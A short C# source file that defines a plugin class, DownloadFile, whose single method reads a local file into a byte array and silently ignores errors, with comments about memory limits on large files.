using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    //TODO : get file size and read offset instead of reading whole file
    internal class DownloadFile
    {
        internal static byte[] ReadFile(string path)
        {
            byte[] result = null;
            try
            {
                result = System.IO.File.ReadAllBytes(path);
            }
            catch(Exception ex)
            {
                //OUT-OF-MEMORY for big file
                //MessageBox.Show(ex.ToString());
            }
            return result;
        }
    }
}
